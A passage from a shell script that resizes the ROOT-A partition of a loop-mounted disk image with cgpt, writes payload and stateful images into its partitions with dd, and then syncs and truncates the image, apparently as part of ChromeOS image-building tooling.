			suppress fast_dd "$((ROOTA_BASE_SIZE / SECTOR_SIZE))" "$((ROOTA_NEW_PER_CHUNK_SIZE / SECTOR_SIZE))" "$(((OVERFLOW_OFFSET + OVERFLOW_SIZE) / SECTOR_SIZE))" 1 1 if="${LOOPDEV}p3" of="${LOOPDEV}p3" conv=notrunc
		fi
	else
		ROOTA_NEW_SIZE=$((MAIN_PAYLOAD_SIZE * ROOTA_CHUNKS))
		log_info "Payload size: $(format_bytes $MAIN_PAYLOAD_SIZE)"

		log_info "Resizing ROOT-A"
		"$CGPT" add "$LOOPDEV" -i 3 -s "$((ROOTA_NEW_SIZE / SECTOR_SIZE))"
		partx -u -n 3 "$LOOPDEV"

		log_info "Injecting payload"
		suppress fast_dd "$((MAIN_PAYLOAD_SIZE / SECTOR_SIZE))" 0 0 1 1 if="$MAIN_PAYLOAD" of="${LOOPDEV}p3" conv=notrunc
	fi

	cgpt_add_auto "$IMAGE" "$LOOPDEV" 1 $((IMAGE_STATEFUL_SIZE / SECTOR_SIZE)) -t data -l STATE
	if [ -n "$IMAGE_STATEFUL_PAYLOAD" ]; then
		log_info "Injecting image stateful payload"
		suppress fast_dd "$((IMAGE_STATEFUL_SIZE / SECTOR_SIZE))" 0 0 1 1 if="$IMAGE_STATEFUL_PAYLOAD" of="${LOOPDEV}p1" conv=notrunc
	else
		log_info "Recreating image stateful"
		suppress mkfs "${LOOPDEV}p1"
	fi
fi

sync
cleanup
[ $PAYLOAD_ONLY -eq 1 ] || truncate_image "$IMAGE" "$FLAGS_finalsizefile"
log_info "Done!"
